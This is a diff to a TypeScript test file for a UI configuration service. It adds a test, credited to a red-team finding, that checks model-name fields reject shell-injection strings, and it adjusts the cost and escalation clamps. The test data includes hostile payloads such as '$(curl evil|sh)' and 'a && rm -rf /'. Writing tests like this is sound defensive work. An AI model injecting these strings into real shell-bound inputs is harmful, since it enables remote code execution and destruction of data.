@@ -84,6 +84,27 @@ describe('uiConfigService', () => {
         expect(out3.taskAutomation.judgeModel).toBe(''); // tipo errado → default (não quebra)
     });
 
+    it('#RCE (red-team Fable): allowlist de charset em TODOS os nomes de modelo (anti shell-injection)', () => {
+        const svc = new UiConfigService('ui.json');
+        // Defaults dos modelos do coder
+        expect(svc.get().taskAutomation.coderModel).toBe('');
+        expect(svc.get().taskAutomation.coderFallbackModel).toBe('');
+        // Nomes REAIS passam intactos (provider/name, tags, versões, IDs longos)
+        for (const good of ['opus', 'minimax/MiniMax-M3', 'zai-coding-plan/glm-5.2', 'us.anthropic.claude-opus-4-5-v1:0', 'openrouter/anthropic/claude-3.5-sonnet']) {
+            expect(svc.update({ taskAutomation: { coderModel: good } } as any).taskAutomation.coderModel).toBe(good);
+        }
+        // Payloads de INJEÇÃO → rejeitados p/ '' (secure-default: herda env, não vai pro shell)
+        for (const evil of ['x; touch PWNED', '$(curl evil|sh)', '`id`', 'a && rm -rf /', 'a|b', 'a"b', "a'b", 'a b', 'a\nb', 'a>b', 'a&b']) {
+            expect(svc.update({ taskAutomation: { coderModel: evil } } as any).taskAutomation.coderModel).toBe('');
+            // MESMA proteção nos 3 modelos que vão ao shell (retrofit dos 2 que já existiam = RCE latente)
+            expect(svc.update({ taskAutomation: { judgeModel: evil } } as any).taskAutomation.judgeModel).toBe('');
+            expect(svc.update({ taskAutomation: { coderEscalationModel: evil } } as any).taskAutomation.coderEscalationModel).toBe('opus'); // default do escalation
+            expect(svc.update({ taskAutomation: { coderFallbackModel: evil } } as any).taskAutomation.coderFallbackModel).toBe('');
+        }
+        // vazio explícito = herda (não é erro)
+        expect(svc.update({ taskAutomation: { coderModel: '   ' } } as any).taskAutomation.coderModel).toBe('');
+    });
+
     it('taskAutomation item 29: piso de nota SANE = 5 (não aceita <5 para aprovar/mergear)', () => {
         const svc = new UiConfigService('ui.json');
         const out = svc.update({ taskAutomation: { minMergeScore: 2, minApproveScore: 1 } } as any);
@@ -97,12 +118,16 @@ describe('uiConfigService', () => {
         expect(svc.get().taskAutomation).toMatchObject({
             opusEscalationEnabled: false, maxOpusEscalationsPerDay: 2, maxOpusCostUsdPerDay: 5, coderEscalationModel: 'opus',
         });
-        // clamps: custo 0-50, escaladas 0-10, model trim/cap; enabled só com true explícito
+        // clamps de SANIDADE (configurável na UI): custo 0-500, escaladas 0-100, model trim/cap; enabled só com true explícito
         const out = svc.update({ taskAutomation: { opusEscalationEnabled: true, maxOpusEscalationsPerDay: 99, maxOpusCostUsdPerDay: 999, coderEscalationModel: '  sonnet  ' } } as any);
         expect(out.taskAutomation.opusEscalationEnabled).toBe(true);
-        expect(out.taskAutomation.maxOpusEscalationsPerDay).toBe(10);   // 99 → teto 10
-        expect(out.taskAutomation.maxOpusCostUsdPerDay).toBe(50);       // 999 → teto 50
+        expect(out.taskAutomation.maxOpusEscalationsPerDay).toBe(99);   // 99 dentro do teto 100 → mantém
+        expect(out.taskAutomation.maxOpusCostUsdPerDay).toBe(500);      // 999 → teto 500
         expect(out.taskAutomation.coderEscalationModel).toBe('sonnet'); // trim
+        // acima do teto de sanidade → clampa (guarda-corpo anti-typo)
+        const outCap = svc.update({ taskAutomation: { maxOpusEscalationsPerDay: 9999, maxOpusCostUsdPerDay: 999999 } } as any);
+        expect(outCap.taskAutomation.maxOpusEscalationsPerDay).toBe(100);
+        expect(outCap.taskAutomation.maxOpusCostUsdPerDay).toBe(500);
         // valores inválidos → default (NUNCA undefined/ilimitado no teto $)
         const out2 = svc.update({ taskAutomation: { opusEscalationEnabled: 'yes', maxOpusCostUsdPerDay: 'lots' } } as any);
         expect(out2.taskAutomation.opusEscalationEnabled).toBe(false);
